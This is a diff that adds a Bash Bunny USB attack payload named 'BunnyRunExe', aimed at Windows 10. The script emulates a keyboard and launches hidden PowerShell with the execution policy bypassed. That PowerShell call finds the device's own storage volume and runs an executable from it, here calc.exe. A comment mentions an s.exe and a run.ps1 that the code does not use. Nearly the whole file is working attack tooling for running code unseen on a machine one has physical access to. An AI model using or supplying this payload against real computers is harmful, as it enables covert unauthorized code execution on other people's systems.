@@ -1,0 +1,18 @@
+# Title:         BunnyRunExe
+# Description:   Run exe from a bunny directory 
+# Author:        ?m?
+# Props:
+# Version:       1.0
+# Category:      Execution
+# Target:        Windows 10
+# Attackmodes:   HID, Storage
+
+#Sets attack mode and stores current switch position
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+#Runs Powershell script run.ps1, which executes our s.exe
+LED ATTACK
+RUN WIN Powershell -nop -ex Bypass -w Hidden "cmd.exe /c ((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\calc.exe')"
+LED FINISH
